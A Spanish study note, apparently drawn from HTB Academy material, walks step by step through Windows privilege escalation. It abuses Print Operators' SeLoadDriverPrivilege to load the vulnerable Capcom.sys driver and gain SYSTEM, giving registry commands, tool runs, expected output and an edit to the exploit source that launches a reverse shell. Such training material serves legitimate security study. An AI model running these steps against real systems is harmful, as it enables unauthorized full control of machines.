
## 1. Enumeración

Los miembros del grupo **Print Operators** pueden disponer del privilegio `SeLoadDriverPrivilege`, que permite cargar y descargar controladores del sistema.

Este privilegio puede aprovecharse para cargar un driver vulnerable, como `Capcom.sys`, y conseguir ejecución como `NT AUTHORITY\SYSTEM`.

### Comprobar grupos y privilegios

```
whoami /groups
whoami /priv
```

Buscar:

```
BUILTIN\Print Operators
SeLoadDriverPrivilege
```

**Importante:**

- Si `SeLoadDriverPrivilege` no aparece, puede ser necesario utilizar una sesión elevada debido a UAC.
    
- Si aparece como `Disabled`, puede habilitarse mediante una herramienta como `EnableSeLoadDriverPrivilege.exe`.
    
- Pertenecer a `Print Operators` no garantiza que el ataque funcione en todas las versiones de Windows.

## 2. Explotación mediante Capcom.sys

### Paso 1. Preparar las herramientas

Necesitamos:

- `Capcom.sys`: driver vulnerable.
    
- `EnableSeLoadDriverPrivilege.exe`: habilita el privilegio y carga el driver.
    
- `ExploitCapcom.exe`: explota el driver para conseguir SYSTEM.
    

El código de `EnableSeLoadDriverPrivilege.cpp` se puede compilar desde el Developer Command Prompt de Visual Studio:

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

### Paso 2. Registrar el driver

Crear las claves necesarias en `HKCU`:

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

**Parámetros importantes:**

- `ImagePath`: ruta del driver.
    
- `Type = 1`: indica un controlador de kernel.
    
- `\??\`: prefijo de ruta de objeto NT.
    

### Paso 3. Comprobar si el driver está cargado

```
.\DriverView.exe /stext drivers.txt
```

```
Get-Content drivers.txt | Select-String "Capcom"
```

Si no devuelve resultados, el driver no aparece en la lista generada.

### Paso 4. Habilitar el privilegio y cargar el driver

```
EnableSeLoadDriverPrivilege.exe
```

Resultado esperado:

```
SeLoadDriverPrivilege Enabled
NTSTATUS: 00000000
WinError: 0
```

Comprobar nuevamente:

```
.\DriverView.exe /stext drivers.txt
Get-Content drivers.txt | Select-String "Capcom"
```

Debería aparecer:

```
Driver Name : Capcom.sys
Filename    : C:\Tools\Capcom.sys
```

### Paso 5. Escalar a SYSTEM

Ejecutar:

```
ExploitCapcom.exe
```

Resultado esperado:

```
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

Comprobar:

```
whoami
```

Resultado:

```
nt authority\system
```

## 3. Explotación sin interfaz gráfica

Si estamos conectados mediante una shell remota, `ExploitCapcom.exe` puede lanzar una consola que no veremos.

En ese caso, debemos modificar `ExploitCapcom.cpp` antes de compilarlo.

Buscar la función `LaunchShell()` y cambiar:

```
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

Por la ruta de un ejecutable que proporcione una conexión remota:

```
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Después:

1. Compilar el exploit modificado.
    
2. Transferir el ejecutable al objetivo.
    
3. Preparar el listener correspondiente.
    
4. Ejecutar `ExploitCapcom.exe`.
    

El objetivo es recibir una shell con privilegios de `SYSTEM` sin depender de una consola gráfica.

## 4. Automatización con EoPLoadDriver

La herramienta `EoPLoadDriver` permite automatizar:

1. Habilitar `SeLoadDriverPrivilege`.
    
2. Crear la configuración del driver.
    
3. Cargar el driver mediante `NtLoadDriver`.
    

Ejecutar:

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

Después, explotar el driver:

```
ExploitCapcom.exe
```

Comprobar los privilegios:

```
whoami
```

---

## 5. Limpieza

Eliminar la clave del Registro creada durante la explotación:

```
reg delete HKCU\System\CurrentControlSet\Capcom
```

Confirmar la eliminación cuando se solicite.

**Nota:** eliminar la clave del Registro no implica necesariamente descargar el driver del kernel.

---

## 6. Limitaciones

Según el material de HTB Academy:

- La técnica basada en referencias a drivers mediante `HKCU` deja de funcionar a partir de Windows 10 versión 1803.
    
- Puede ser necesario elevar la sesión para que aparezca `SeLoadDriverPrivilege`.
    
- El ataque depende de poder cargar un driver vulnerable.
    
- Las protecciones modernas de Windows pueden impedir la carga de drivers vulnerables.
